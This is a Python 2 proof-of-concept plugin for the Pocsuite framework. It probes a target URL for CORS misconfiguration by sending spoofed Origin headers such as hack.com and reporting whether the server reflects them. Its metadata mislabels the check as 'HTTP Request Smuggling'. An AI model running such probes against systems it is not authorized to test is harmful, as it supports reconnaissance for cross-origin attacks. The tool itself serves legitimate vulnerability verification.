#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Copyright (c) 2014-2015 pocsuite developers (http://seebug.org)
See the file 'docs/COPYING' for copying permission
"""
#命令行
from pocsuite import pocsuite_cli
#验证模块
from pocsuite import pocsuite_verify
#攻击模块
from pocsuite import pocsuite_attack
#控制台模式
from pocsuite import pocsuite_console
from pocsuite.api.request import req 
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase


class CORSPOC(POCBase):
    vulID = '37'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1' #默认为1
    vulDate = '2018-06-05' #漏洞公开的时间,不知道就写今天

    author = 'wangqi' #  PoC作者的大名
    createDate = '2018-06-05'# 编写 PoC 的日期
    updateDate = '2018-06-05'# PoC 更新的时间,默认和编写时间一样
    references = ''# 漏洞地址来源,0day不用写
    name = 'CORS'# PoC 名称
    appPowerLink = '#'# 漏洞厂商主页地址
    appName = 'http'# 漏洞应用名称
    appVersion = 'all versions'# 漏洞影响版本
    vulType = 'HTTP Request Smuggling'#漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        HTTP CORS 跨域
    ''' # 漏洞简要描述
    samples = []# 测试样列,就是用 PoC 测试成功的网站
    install_requires = [] # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"低危" #严重,高危,中危,低危


    #验证漏洞 pocsuite -r http-clear-password.py -u 10.1.5.26 --verify
    def _verify(self):
        #定义返回结果
        result = {}
        from urlparse import urlparse
        #获取漏洞IP
        vul_ip = urlparse(self.url).netloc
        print vul_ip
        origins = ['hack.com', 'hack'+vul_ip, vul_ip+'.hack.com']
        headers = {
                'Origin': 
                '',
                'Cache-Control':
                'no-cache',
                'Cookie':
                'a=b',
                'User-Agent':
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36'
            }
        proxies = {
            # 'http': 'http://127.0.0.1:8080',
            # 'https':'http://127.0.0.1:8080',
        }
        for origin in origins:
            headers['Origin'] = origin
            try:
                response = req.head(url=self.url, headers=headers, timeout=5, proxies=proxies, allow_redirects=False)
                print response.headers
                if response.headers['Access-Control-Allow-Origin']:
                    if origin in response.headers['Access-Control-Allow-Origin']:
                        result['VerifyInfo'] = {}
                        result['VerifyInfo']['URL'] = self.url
                        result['VerifyInfo']['Payload'] = "Origin: %s" % origin
                        break
                else:
                    result = {}
            except Exception, e:
                print e

        print '[+]37 poc done'
        return self.save_output(result)

    #漏洞攻击
    def _attack(self):
        result = {}
        # 攻击代码
        return self._verify()

    def save_output(self, result):
        #判断有无结果并输出
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output

register(CORSPOC)

